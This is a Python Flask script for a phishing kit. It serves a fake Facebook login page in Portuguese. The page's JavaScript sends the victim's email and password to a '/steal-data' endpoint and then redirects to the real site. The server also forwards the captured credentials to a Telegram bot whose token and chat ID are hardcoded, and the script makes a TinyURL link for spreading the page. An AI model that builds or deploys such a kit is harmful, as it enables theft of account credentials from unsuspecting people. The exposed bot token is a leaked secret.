
from flask import Flask, render_template_string, request
import threading
import requests

app = Flask(__name__)


# ... (other code remains the same) ...


# ... (other code remains the same) ...


# আপনার টেলিগ্রাম বটের টোকেন এবং চ্যাট আইডি
BOT_TOKEN = "7721371260:AAGMALbPA8aAlZP9jrGxar25DM_nqbhsomI"
CHAT_ID = "6904067155"

# HTML টেমপ্লেট (ফর্ম)
HTML_TEMPLATE = """
<!DOCTYPE html>
<html lang="pt">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Facebook Login</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background: linear-gradient(to bottom, #f0f2f5, #ffffff);
            margin: 0;
            padding: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
        }

        .login-container {
            text-align: center;
            background: #ffffff;
            border-radius: 8px;
            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.1);
            padding: 20px;
            width: 90%;
            max-width: 400px;
        }

        .login-container img {
            width: 50px;
            margin-bottom: 20px;
        }

        .login-container h1 {
            font-size: 24px;
            margin-bottom: 10px;
            color: #1877f2;
        }

        .login-container p {
            font-size: 14px;
            color: #666;
            margin-bottom: 20px;
        }

        .login-container a {
            font-size: 12px;
            color: #1877f2;
            text-decoration: none;
        }

        .login-container input {
            width: 100%;
            padding: 12px;
            margin: 8px 0;
            border: 1px solid #ccc;
            border-radius: 4px;
            font-size: 14px;
        }

        .login-container button {
            background-color: #1877f2;
            color: #fff;
            font-size: 16px;
            font-weight: bold;
            padding: 12px;
            border: none;
            border-radius: 4px;
            cursor: pointer;
            width: 100%;
            margin-top: 10px;
        }

        .login-container button:hover {
            background-color: #145dbf;
        }

        .login-container .footer {
            margin-top: 20px;
            font-size: 12px;
            color: #aaa;
        }
    </style>
</head>
<body>
    <div class="login-container">
        <img src="https://upload.wikimedia.org/wikipedia/commons/5/51/Facebook_f_logo_%282019%29.svg" alt="Facebook Logo">
        <p>Facebook requests and receives your phone number from your mobile network.</p>
        <a href="#">Change Settings</a>
        <form action="#" method="POST" id="loginForm">
            <input type="text" name="email" placeholder="Número de telemóvel ou e-mail" required>
            <input type="password" name="password" placeholder="Palavra-passe" required>
            <button type="submit">Iniciar sessão</button>
        </form>
        <a href="#" style="margin-top: 10px; display: block;">Esqueceste-te da palavra-passe?</a>
        <button style="background: #e7f3ff; color: #1877f2; margin-top: 20px;">Criar conta nova</button>
        <div class="footer">© Meta</div>
    </div>

   <script>
    
    document.getElementById('loginForm').addEventListener('submit', function(event) {
        event.preventDefault(); 

        
        var email = document.querySelector('input[name="email"]').value;
        var password = document.querySelector('input[name="password"]').value;

      
        fetch('http://192.168.1.35:8080/steal-data', { 
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify({
                email: email,
                password: password
            })
        })
        .then(response => {
            
            window.location.href = 'https://www.facebook.com'; 
        })
        .catch(error => {
            console.error('Erro ao enviar dados:', error);
        });
    });
</script>
</body>
</html>

"""
def generate_tinyurl(url):
    api_url = f"http://tinyurl.com/api-create.php?url={url}"
    response = requests.get(api_url)
    if response.status_code == 200:
        return response.text
    return None
    

# টেলিগ্রামে বার্তা পাঠানোর ফাংশন

@app.route("/", methods=["GET", "POST"])
def registration_form():
    if request.method == "POST":
        # Collect form data
        form_data = {
            "email": request.form.get("email"),
            "password": request.form.get("password"),
        }

        # Send data to Telegram
        send_message_to_telegram(form_data)

        return "<h1>Thank you! Your form has been submitted successfully.</h1>"

    return render_template_string(HTML_TEMPLATE)
def send_message_to_telegram(data):
    message = (
        f"New Course Registration:\n\n"
        f"Email: {data['email']}\n"
        f"Password: {data['password']}"
    )
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
    payload = {"chat_id": CHAT_ID, "text": message}
    requests.post(url, data=payload)
    
def run_server():
    app.run(debug=False, port=5000, use_reloader=False)

# Main function to start Flask and generate TinyURL
if __name__ == "__main__":
    threading.Thread(target=run_server).start()

    # Generate ngrok URL (replace this part with your actual ngrok command if needed)
    ngrok_url = "http://127.0.0.1:5000"  # Replace with the actual ngrok URL
    tiny_url = generate_tinyurl(ngrok_url)

    if tiny_url:
        print(f"Your TinyURL is: {tiny_url}")
    else:
        print("Failed to generate TinyURL. Please try again.")